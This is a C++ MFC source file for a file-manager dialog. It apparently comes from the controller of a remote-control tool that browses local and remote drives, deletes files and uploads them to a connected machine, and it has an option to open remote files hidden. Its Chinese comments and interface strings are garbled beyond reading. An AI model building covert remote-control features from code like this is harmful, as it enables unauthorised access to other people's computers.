// FileManagerDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Remote.h"
#include "FileManagerDlg.h"
#include "afxdialogex.h"
#include "IOCPServer.h"
#include "Common.h"
#include "InputDialog.h"
#include "FileTransferModeDlg.h"



typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;

static UINT indicators[] =
{
	ID_SEPARATOR,           
	ID_SEPARATOR,
	ID_SEPARATOR
};

// CFileManagerDlg �Ի���

IMPLEMENT_DYNAMIC(CFileManagerDlg, CDialog)

CFileManagerDlg::CFileManagerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CFileManagerDlg::IDD, pParent)
{
	SHFILEINFO	sfi;
	SHGetFileInfo
		(
		"\\\\",                   //��㴫�������ֽ�
		FILE_ATTRIBUTE_NORMAL, 
		&sfi,
		sizeof(SHFILEINFO), 
		SHGFI_ICON | SHGFI_USEFILEATTRIBUTES    //ͼ��
		);
	m_hIcon = sfi.hIcon;	


	HIMAGELIST hImageList;
	// ����ϵͳͼ���б�
	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_LARGEICON | SHGFI_SYSICONINDEX
		);
	m_pImageList_Large = CImageList::FromHandle(hImageList);

	// ����ϵͳͼ���б�
	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_SMALLICON | SHGFI_SYSICONINDEX
		);
	m_pImageList_Small = CImageList::FromHandle(hImageList);

	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	//�õ����ӱ��ض˵�IP
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);

	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	// ����Զ���������б�
	memset(m_bRemoteDriveList, 0, sizeof(m_bRemoteDriveList));
	memcpy(m_bRemoteDriveList, m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);

	m_nTransferMode = TRANSFER_MODE_NORMAL;
	m_nOperatingFileLength = 0;
	m_nCounter = 0;

	m_bIsStop = false;   //OninitDialog�д�����������Ϣ



}

CFileManagerDlg::~CFileManagerDlg()
{
}

void CFileManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_LOCAL, m_list_local);
	DDX_Control(pDX, IDC_LIST_REMOTE, m_list_remote);
	DDX_Control(pDX, IDC_LOCAL_PATH, m_Local_Directory_ComboBox);
	DDX_Control(pDX, IDC_REMOTE_PATH, m_Remote_Directory_ComboBox);
}


BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_LOCAL, &CFileManagerDlg::OnDblclkListLocal)
	ON_COMMAND(IDM_LOCAL_BIGICON, &CFileManagerDlg::OnLocalBigicon)
	ON_COMMAND(IDM_LOCAL_SMALLICON, &CFileManagerDlg::OnLocalSmallicon)
	ON_COMMAND(IDM_LOCAL_LIST, &CFileManagerDlg::OnLocalList)
	ON_COMMAND(IDM_LOCAL_REPORT, &CFileManagerDlg::OnLocalReport)
	ON_COMMAND(IDM_REMOTE_BIGICON, &CFileManagerDlg::OnRemoteBigicon)
	ON_COMMAND(IDM_REMOTE_SMALLICON, &CFileManagerDlg::OnRemoteSmallicon)
	ON_COMMAND(IDM_REMOTE_LIST, &CFileManagerDlg::OnRemoteList)
	ON_COMMAND(IDM_REMOTE_REPORT, &CFileManagerDlg::OnRemoteReport)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_REMOTE, &CFileManagerDlg::OnDblclkListRemote)
	ON_COMMAND(IDT_LOCAL_PREV, &CFileManagerDlg::OnIdtLocalPrev)
	ON_COMMAND(IDT_REMOTE_PREV, &CFileManagerDlg::OnIdtRemotePrev)
	ON_COMMAND(IDT_LOCAL_NEWFOLDER, &CFileManagerDlg::OnIdtLocalNewfolder)
	ON_COMMAND(IDM_RENAME, &CFileManagerDlg::OnRename)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_LOCAL, &CFileManagerDlg::OnNMRClickListLocal)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_LOCAL, &CFileManagerDlg::OnLvnEndlabeleditListLocal)
	ON_COMMAND(IDM_DELETE, &CFileManagerDlg::OnDelete)
	ON_COMMAND(IDT_LOCAL_DELETE, &CFileManagerDlg::OnIdtLocalDelete)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_REMOTE, &CFileManagerDlg::OnLvnEndlabeleditListRemote)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_REMOTE, &CFileManagerDlg::OnNMRClickListRemote)
	ON_COMMAND(IDT_REMOTE_DELETE, &CFileManagerDlg::OnIdtRemoteDelete)
	ON_COMMAND(IDT_REMOTE_NEWFOLDER, &CFileManagerDlg::OnIdtRemoteNewfolder)
	ON_COMMAND(IDM_NEWFOLDER, &CFileManagerDlg::OnNewfolder)
	ON_COMMAND(IDM_REFRESH, &CFileManagerDlg::OnRefresh)
	ON_COMMAND(IDT_LOCAL_COPY, &CFileManagerDlg::OnIdtLocalCopy)
	ON_COMMAND(IDT_REMOTE_COPY, &CFileManagerDlg::OnIdtRemoteCopy)
	ON_COMMAND(IDM_TRANSFER, &CFileManagerDlg::OnTransfer)
	ON_COMMAND(IDM_LOCAL_OPEN, &CFileManagerDlg::OnLocalOpen)
	ON_COMMAND(IDM_REMOTE_OPEN_SHOW, &CFileManagerDlg::OnRemoteOpenShow)
	ON_COMMAND(IDM_REMOTE_OPEN_HIDE, &CFileManagerDlg::OnRemoteOpenHide)
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_LOCAL, &CFileManagerDlg::OnLvnBegindragListLocal)
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_REMOTE, &CFileManagerDlg::OnLvnBegindragListRemote)
	ON_WM_MOUSEMOVE()
	ON_WM_LBUTTONUP()
	ON_COMMAND(IDT_LOCAL_STOP, &CFileManagerDlg::OnIdtLocalStop)
	ON_COMMAND(IDT_REMOTE_STOP, &CFileManagerDlg::OnIdtRemoteStop)
	ON_CBN_SELCHANGE(IDC_REMOTE_PATH, &CFileManagerDlg::OnCbnSelchangeRemotePath)
END_MESSAGE_MAP()





///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////����Ľ������ݵ���Ӧ
void CFileManagerDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FILE_LIST: 
		{
			FixedRemoteFileList(m_pContext->m_DeCompressionBuffer.GetBuffer(0),m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
			break;
		}

	case TOKEN_RENAME_FINISH:
		{
			// ˢ��Զ���ļ��б�
			GetRemoteFileList(".");
			break;
		}

	case TOKEN_DELETE_FINISH:
		{
			EndRemoteDeleteFile();     //
			break;

		}
	case TOKEN_CREATEFOLDER_FINISH:
		{
			GetRemoteFileList(".");
			break;

		}
	case TOKEN_DATA_CONTINUE:        //��������                                      �����ض˵����ض�
		{
			SendFileData();
			break;
		}

	case TOKEN_TRANSFER_FINISH:      //�������                                      �ӱ��ض˵����ض�
		{
			EndLocalRecvFile();
			break;
		}

	case TOKEN_FILE_SIZE:           //�����ļ�ʱ�ĵ�һ�����ݰ����ļ���С�����ļ���    �ӱ��ض˵����ض�
		{
			CreateLocalRecvFile();
			break;
		}

	case TOKEN_FILE_DATA:           // �ļ�����
		{
			WriteLocalRecvFile();   //���ض˽��յ����ݽ�����д���ļ�
			break;
		}


	case TOKEN_GET_TRANSFER_MODE:   //�����ƶ˷��͵��ļ����ض��д��ھͻ���ܵ����ض˵ĸ���Ϣ
		{
			SendTransferMode();
			break;
		}
	default:
		SendException();
		break;
	}
}




// CFileManagerDlg ��Ϣ�������


BOOL CFileManagerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	RECT	rect;
	GetClientRect(&rect);


	//���ض�
	if (!m_wndToolBar_Local.Create(this, WS_CHILD |
		WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, IDR_TOOLBAR_LOCAL) 
		||!m_wndToolBar_Local.LoadToolBar(IDR_TOOLBAR_LOCAL))
	{
	
		return -1;
	}
	m_wndToolBar_Local.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
	m_wndToolBar_Local.LoadTrueColorToolBar
		(
		24,    //������ʹ�����
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_DISABLE
		);
	// ���������ť
	m_wndToolBar_Local.AddDropDownButton(this, IDT_LOCAL_VIEW, IDR_LOCAL_VIEW);



	//���ض�
	if (!m_wndToolBar_Remote.Create(this, WS_CHILD |
		WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, IDR_TOOLBAR_REMOTE) 
		||!m_wndToolBar_Remote.LoadToolBar(IDR_TOOLBAR_REMOTE))
	{
		TRACE0("Failed to create toolbar ");
		return -1; //Failed to create
	}
	m_wndToolBar_Remote.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
	m_wndToolBar_Remote.LoadTrueColorToolBar
		(
		24,    //������ʹ�����    
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_DISABLE
		);
	// ���������ť
	m_wndToolBar_Remote.AddDropDownButton(this, IDT_REMOTE_VIEW, IDR_REMOTE_VIEW);

	//��ʾ������
	m_wndToolBar_Local.MoveWindow(268, 10, rect.right - 268, 48);
	m_wndToolBar_Remote.MoveWindow(268, rect.bottom / 2 - 10, rect.right - 268, 48);


	// ���ñ���
	CString str;
	str.Format("\\\\%s - �ļ�����",m_IPAddress);
	SetWindowText(str);

	// Ϊ�б���ͼ����ImageList
	m_list_local.SetImageList(m_pImageList_Large, LVSIL_NORMAL);
	m_list_local.SetImageList(m_pImageList_Small, LVSIL_SMALL);



	// ��������������״̬��
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))
	{
		return -1;      
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 50);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //��ʾ״̬��	

	m_wndStatusBar.GetItemRect(1, &rect);
	
	m_ProgressCtrl = new CProgressCtrl;
	m_ProgressCtrl->Create(PBS_SMOOTH | WS_VISIBLE, rect, &m_wndStatusBar, 1);
	m_ProgressCtrl->SetRange(0, 100);           //���ý�������Χ 100 
	m_ProgressCtrl->SetPos(0);                  //���ý�������ǰλ��

	


	//�����ǳ�ʼ�������������б��������������б���ʾ���б���
	FixedLocalDriveList();
	//�����ǳ�ʼ���������б�������˴��ݽ�������Ϣ��ʾ���б���
	FixedRemoteDriveList();

	m_nDragIndex = -1;
	m_nDropIndex = -1;
	CoInitialize(NULL);
	SHAutoComplete(GetDlgItem(IDC_LOCAL_PATH)->GetWindow(GW_CHILD)->m_hWnd, SHACF_FILESYSTEM);


	return TRUE; 
}



void CFileManagerDlg::OnClose()
{

	CoUninitialize();   //ж�ش����ϵ�Com��
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);

	CDialog::OnClose();
}





///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////���ض˵ĸ����������б�
void CFileManagerDlg::FixedLocalDriveList()
{
	char	DriveString[256];
	char	*pDrive = NULL;
	m_list_local.DeleteAllItems();
	while(m_list_local.DeleteColumn(0) != 0);
	//��ʼ���б���Ϣ
	m_list_local.InsertColumn(0, "����",  LVCFMT_LEFT, 200);
	m_list_local.InsertColumn(1, "����", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(2, "�ܴ�С", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(3, "���ÿռ�", LVCFMT_LEFT, 115);

	
	GetLogicalDriveStrings(sizeof(DriveString), DriveString);
	pDrive = DriveString;

	char	FileSystem[MAX_PATH];
	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // �ܴ�С
	unsigned long		FreeMB = 0; // ʣ��ռ�
	
	for (int i = 0; *pDrive != '\0'; i++, pDrive += lstrlen(pDrive) + 1)
	{
		// �õ����������Ϣ
		memset(FileSystem, 0, sizeof(FileSystem));
		// �õ��ļ�ϵͳ��Ϣ����С
		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);

		int	nFileSystemLen = lstrlen(FileSystem) + 1;
		if (GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}


		int	nItem = m_list_local.InsertItem(i, pDrive, GetIconIndex(pDrive, GetFileAttributes(pDrive)));    //���ϵͳ��ͼ��
		m_list_local.SetItemData(nItem, 1);
	
		if (lstrlen(FileSystem) == 0)
		{
			SHFILEINFO	sfi;
			SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
			m_list_local.SetItemText(nItem, 1, sfi.szTypeName);
		}
		else
		{
			m_list_local.SetItemText(nItem, 1, FileSystem);
		}
		CString	str;
		str.Format("%10.1f GB", (float)AmntMB / 1024);
		m_list_local.SetItemText(nItem, 2, str);
		str.Format("%10.1f GB", (float)FreeMB / 1024);
		m_list_local.SetItemText(nItem, 3, str);
	}
	// ���ñ��ص�ǰ·��
	
	m_Local_Directory_ComboBox.ResetContent();

	
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////��ListLocal�ؼ��ϵ�˫�������Ϣ
void CFileManagerDlg::OnDblclkListLocal(NMHDR *pNMHDR, LRESULT *pResult)     
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	if (m_list_local.GetSelectedCount() == 0 || m_list_local.GetItemData(m_list_local.GetSelectionMark()) != 1)
		return;
	FixedLocalFileList();
	*pResult = 0;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////��ListLocal�ؼ�����ɱ༭�Ĵ�����Ӧ
void CFileManagerDlg::OnLvnEndlabeleditListLocal(NMHDR *pNMHDR, LRESULT *pResult)
{
	NMLVDISPINFO *pDispInfo = reinterpret_cast<NMLVDISPINFO*>(pNMHDR);
	CString str, strExistingFileName, strNewFileName;
	m_list_local.GetEditControl()->GetWindowText(str);

	strExistingFileName = m_Local_Path + m_list_local.GetItemText(pDispInfo->item.iItem, 0);
	strNewFileName = m_Local_Path + str;
	*pResult = ::MoveFile(strExistingFileName.GetBuffer(0), strNewFileName.GetBuffer(0));                  //�ļ���������

}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////��ListLocal�ؼ��ϵ��Ҽ����������˵���Ϣ
void CFileManagerDlg::OnNMRClickListLocal(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	CListCtrl	*pListCtrl = &m_list_local;
	CMenu	popup;
	popup.LoadMenu(IDR_FILEMANAGER);   //���ز˵�    // Fview
	CMenu*	pM = popup.GetSubMenu(0);                // shanf  dfjkdjf   djfkdfjkdf
	CPoint	p;
	GetCursorPos(&p);
	pM->DeleteMenu(6, MF_BYPOSITION);
	if (pListCtrl->GetSelectedCount() == 0)    //ControlList
	{
		int	count = pM->GetMenuItemCount();
		for (int i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
	}
	if (pListCtrl->GetSelectedCount() <= 1)    //1
	{
		pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);
	}
	if (pListCtrl->GetSelectedCount() == 1)
	{
		// ���ļ���
		if (pListCtrl->GetItemData(pListCtrl->GetSelectionMark()) == 1)
			pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_GRAYED);
		else
			pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_ENABLED);
	}
	else
		pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_GRAYED);


	pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);	
	*pResult = 0;

}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////���ض˵��ļ��б�
void CFileManagerDlg::FixedLocalFileList(CString directory)
{
	if (directory.GetLength() == 0)
	{
		int	nItem = m_list_local.GetSelectionMark();

		// �����ѡ�еģ���Ŀ¼
		if (nItem != -1)
		{
			if (m_list_local.GetItemData(nItem) == 1)
			{
				directory = m_list_local.GetItemText(nItem, 0);   
			}
		}
		// ����Ͽ���õ�·��
		else
		{
			m_Local_Directory_ComboBox.GetWindowText(m_Local_Path);
		}
	}




	// �õ���Ŀ¼
	if (directory == "..")
	{
		m_Local_Path = GetParentDirectory(m_Local_Path);
	}
	// ˢ�µ�ǰ��
	else if (directory != ".")
	{	
		m_Local_Path += directory;
		if(m_Local_Path.Right(1) != "\\")
			m_Local_Path += "\\";
	}


	// ���������ĸ�Ŀ¼,���ش����б�
	if (m_Local_Path.GetLength() == 0)  //
	{
		FixedLocalDriveList();
		return;
	}

	m_Local_Directory_ComboBox.InsertString(0, m_Local_Path);
	m_Local_Directory_ComboBox.SetCurSel(0);

	// �ؽ�����
	m_list_local.DeleteAllItems();
	while(m_list_local.DeleteColumn(0) != 0);
	m_list_local.InsertColumn(0, "����",  LVCFMT_LEFT, 200);
	m_list_local.InsertColumn(1, "��С", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(2, "����", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(3, "�޸�����", LVCFMT_LEFT, 115);

	int			nItemIndex = 0;
	m_list_local.SetItemData
		(
		m_list_local.InsertItem(nItemIndex++, "..", GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),
		1
		);

	// i Ϊ 0 ʱ��Ŀ¼��i Ϊ 1ʱ���ļ�
	for (int i = 0; i < 2; i++)
	{
		CFileFind	file;
		BOOL		bContinue;
		bContinue = file.FindFile(m_Local_Path + "*.*");
		while (bContinue)
		{	
			bContinue = file.FindNextFile();
			if (file.IsDots())	
				continue;
			bool bIsInsert = !file.IsDirectory() == i;

			if (!bIsInsert)
				continue;

			int nItem = m_list_local.InsertItem(nItemIndex++, file.GetFileName(), 
				GetIconIndex(file.GetFileName(), GetFileAttributes(file.GetFilePath())));
			m_list_local.SetItemData(nItem,	file.IsDirectory());
			SHFILEINFO	sfi;
			SHGetFileInfo(file.GetFileName(), FILE_ATTRIBUTE_NORMAL, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);   
			m_list_local.SetItemText(nItem, 2, sfi.szTypeName);

			CString str;
			str.Format("%10d KB", file.GetLength() / 1024 + (file.GetLength() % 1024 ? 1 : 0));
			m_list_local.SetItemText(nItem, 1, str);
			CTime time;
			file.GetLastWriteTime(time);
			m_list_local.SetItemText(nItem, 3, time.Format("%Y-%m-%d %H:%M"));
		}
	}


}

CString CFileManagerDlg::GetParentDirectory(CString strPath)
{
	CString	strCurPath = strPath;
	int Index = strCurPath.ReverseFind('\\');
	if (Index == -1)
	{
		return strCurPath;
	}
	CString str = strCurPath.Left(Index);
	Index = str.ReverseFind('\\');
	if (Index == -1)
	{
		strCurPath = "";
		return strCurPath;
	}
	strCurPath = str.Left(Index);

	if(strCurPath.Right(1) != "\\")
		strCurPath += "\\";
	return strCurPath;
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////��ʲ˵�
void CFileManagerDlg::OnIdtLocalPrev()                                                                                       //��ʷ����ϲ�Ŀ¼
{
	// TODO: �ڴ���������������

	FixedLocalFileList("..");
}


void CFileManagerDlg::OnIdtLocalNewfolder()                                                                                  //��ʴ����µ�Ŀ¼
{
	if (m_Local_Path == "")
		return;


	CInputDialog	dlg;
	if (dlg.DoModal() == IDOK && dlg.m_str.GetLength())
	{
		// �������Ŀ¼
		MakeSureDirectoryPathExists(m_Local_Path + dlg.m_str + "\\");
		FixedLocalFileList(".");
	}
}



void CFileManagerDlg::OnIdtLocalDelete()                                                                                     //���ɾ��Ŀ¼�����ļ�
{
	m_bIsUpload = true;                                                                        //���ǿ���ʹ�����Flag����ֹͣ ��ǰ�Ĺ���
	CString str;
	if (m_list_local.GetSelectedCount() > 1)
		str.Format("ȷ��Ҫ���� %d ��ɾ����?", m_list_local.GetSelectedCount());
	else
	{
		CString file = m_list_local.GetItemText(m_list_local.GetSelectionMark(), 0);

		int a = m_list_local.GetSelectionMark();   //  suan

		if (a==-1)
		{
			return;
		}
		if (m_list_local.GetItemData(a) == 1)   //[]
			str.Format("ȷʵҪɾ���ļ��С�%s��������������ɾ����?", file);
		else
			str.Format("ȷʵҪ�ѡ�%s��ɾ����?", file);
	}
	if (::MessageBox(m_hWnd, str, "ȷ��ɾ��", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;

	EnableControl(FALSE);

	POSITION pos = m_list_local.GetFirstSelectedItemPosition();  //  20  21 3
	while(pos)
	{
		int nItem = m_list_local.GetNextSelectedItem(pos);
		CString	file = m_Local_Path + m_list_local.GetItemText(nItem, 0);   //C:\
		// �����Ŀ¼
		if (m_list_local.GetItemData(nItem))
		{
			file += '\\';
			DeleteDirectory(file);
		}
		else
		{
			DeleteFile(file);
		}
	} 
	// �����ļ�������
	EnableControl(TRUE);

	FixedLocalFileList(".");
}


bool CFileManagerDlg::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];

	wsprintf(lpszFilter, "%s\\*.*", lpszDirectory);

	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // ���û���ҵ������ʧ��
		return FALSE;

	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteFile(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));

	FindClose(hFind); // �رղ��Ҿ��

	if(!RemoveDirectory(lpszDirectory))
	{
		return FALSE;
	}
	return true;
}


void CFileManagerDlg::OnLocalBigicon()																					      //�����ʾ���ݵ�״̬
{
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_ICON);	
}


void CFileManagerDlg::OnLocalSmallicon()
{
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);
}


void CFileManagerDlg::OnLocalList()
{
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_LIST);	
}


void CFileManagerDlg::OnLocalReport()
{
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);	
}


void CFileManagerDlg::OnIdtLocalStop()																						//���ֹͣ����
{
	m_bIsStop = true;
}



void CFileManagerDlg::OnIdtLocalCopy()																						 //��ʴ��书��  �����ض˵����ض�
{
	m_bIsUpload = true;
	if (m_nDropIndex != -1 && m_pDropList->GetItemData(m_nDropIndex))
		m_hCopyDestFolder = m_pDropList->GetItemText(m_nDropIndex, 0);                            //����ק�������õ�
	m_Remote_Upload_Job.RemoveAll();                                                                   
	POSITION pos = m_list_local.GetFirstSelectedItemPosition();
	while(pos) 
	{
		int nItem = m_list_local.GetNextSelectedItem(pos);
		CString	file = m_Local_Path + m_list_local.GetItemText(nItem, 0);
		// �����Ŀ¼
		if (m_list_local.GetItemData(nItem))
		{
			file += '\\';
			FixedUploadDirectory(file.GetBuffer(0));
		}
		else
		{
			// ��ӵ��ϴ������б���ȥ
			m_Remote_Upload_Job.AddTail(file);
		}

	} 
	if (m_Remote_Upload_Job.IsEmpty())
	{
		::MessageBox(m_hWnd, "�ļ���Ϊ��", "����", MB_OK|MB_ICONWARNING);
		return;
	}
	EnableControl(FALSE);
	SendUploadJob();                           //���͵�һ������
}



BOOL CFileManagerDlg::SendUploadJob()																						//�����ض˵����ض˵ķ�������
{
	if (m_Remote_Upload_Job.IsEmpty())
		return FALSE;

	CString	strDestDirectory = m_Remote_Path;
	// ���Զ��Ҳ��ѡ�񣬵���Ŀ���ļ���
	int nItem = m_list_remote.GetSelectionMark();

	// ���ļ���
	if (nItem != -1 && m_list_remote.GetItemData(nItem) == 1)
	{
		strDestDirectory += m_list_remote.GetItemText(nItem, 0) + "\\";     //�����ComBox�ؼ���ѡ���·��
	}

	if (!m_hCopyDestFolder.IsEmpty())                      //������ʹ������ק�����ļ�ʹ�õ�·��
	{
		strDestDirectory += m_hCopyDestFolder + "\\";
	}


	m_strOperatingFile = m_Remote_Upload_Job.GetHead();    //��õ�һ�����������

	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 �ֽ�token, 8�ֽڴ�С, �ļ�����, '\0'
	HANDLE	hFile;
	CString	fileRemote = m_strOperatingFile;               // Զ���ļ�

	// �õ�Ҫ���浽��Զ�̵��ļ�·��
	fileRemote.Replace(m_Local_Path, strDestDirectory);
	m_strUploadRemoteFile = fileRemote;


	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);   //���Ҫ�����ļ��Ĵ�С
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow =	GetFileSize (hFile, &dwSizeHigh);
	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+1)) + dwSizeLow;

	CloseHandle(hFile);
	// �������ݰ��������ļ�����
	int		nPacketSize = fileRemote.GetLength() + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);

	bPacket[0] = COMMAND_FILE_SIZE;

	//�򱻿ض˷�����ϢCOMMAND_FILE_SIZE   ���ض˻�ִ��CreateLocalRecvFile�����Ӷ��ֳ��������һ����Ҫ�����ļ��Ѿ����ھͻ���յ�       TOKEN_GET_TRANSFER_MODE 
	//																					   ��һ���Ǳ��ض˵���GetFileData�����Ӷ����յ�TOKEN_DATA_CONTINUE


	memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
	memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
	memcpy(bPacket + 9, fileRemote.GetBuffer(0), fileRemote.GetLength() + 1);

	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);

	// �����������б���ɾ���Լ�
	m_Remote_Upload_Job.RemoveHead();
	return TRUE;
}



void CFileManagerDlg::SendTransferMode()																					//������ض˷��͵��ļ��ڱ��ض��ϴ�����ʾ��δ���  
{
	CFileTransferModeDlg	dlg(this);
	dlg.m_strFileName = m_strUploadRemoteFile;
	switch (dlg.DoModal())
	{
	case IDC_OVERWRITE:
		m_nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case IDC_OVERWRITE_ALL:
		m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
		break;
	case IDC_JUMP:
		m_nTransferMode = TRANSFER_MODE_JUMP;
		break;
	case IDC_JUMP_ALL:
		m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
		break;
	case IDCANCEL:
		m_nTransferMode = TRANSFER_MODE_CANCEL;
		break;
	}
	if (m_nTransferMode == TRANSFER_MODE_CANCEL)
	{
		m_bIsStop = true;
		EndLocalUploadFile();
		return;
	}

	BYTE bToken[5];
	bToken[0] = COMMAND_SET_TRANSFER_MODE;
	memcpy(bToken + 1, &m_nTransferMode, sizeof(m_nTransferMode));
	m_iocpServer->Send(m_pContext, (unsigned char *)&bToken, sizeof(bToken));
}


void CFileManagerDlg::EndLocalUploadFile()																						//���������ͼ�������û�оͻָ�����	                       
{

	m_nCounter = 0;
	m_strOperatingFile = "";
	m_nOperatingFileLength = 0;

	if (m_Remote_Upload_Job.IsEmpty() || m_bIsStop)
	{
		m_Remote_Upload_Job.RemoveAll();
		m_bIsStop = false;
		EnableControl(TRUE);
		GetRemoteFileList(".");

	}
	else
	{

		Sleep(5);
		SendUploadJob();
	}
	return;
}




void CFileManagerDlg::OnLocalOpen()																							 //�˵����ش�
{
	CString	str;
	str = m_Local_Path + m_list_local.GetItemText(m_list_local.GetSelectionMark(), 0);
	ShellExecute(NULL, "open", str, NULL, NULL, SW_SHOW);
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////��ʲ˵�






